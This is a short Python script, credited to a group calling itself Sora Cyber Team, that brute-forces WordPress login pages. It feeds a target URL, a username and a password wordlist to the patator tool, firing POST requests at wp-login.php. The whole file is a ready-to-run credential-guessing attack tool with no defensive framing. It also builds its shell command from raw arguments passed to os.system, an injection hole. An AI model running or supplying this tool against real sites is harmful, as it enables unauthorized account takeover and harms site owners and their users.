#!/usr/bin/python
import sys,os
def banner():
    print """
+++++++++++++++++++ | Author : FilthyRoot
+ Wordpress Brute + | Github : soracyberteam
+++++++++++++++++++ | Copyright (c) 2019 Sora Cyber Team
"""
if len(sys.argv) == 1:
    banner()
    print """
Warning! This tool will need "patator". Install it first.

Usage : python wp_brute.py [url] [username] [wordlist]
        python wp_brute.py http://target.com/ admin /path/to/wordlist.txt"""
else:
    banner()
    url=sys.argv[1]
    user=sys.argv[2]
    wordlist=sys.argv[3]
    os.system("patator http_fuzz url="+url+"/wp-login.php method=POST body='log="+user+"&pwd=FILE0&wp-submit=Log+Masuk' 0="+wordlist+" -x ignore:fgrep='ERROR'")
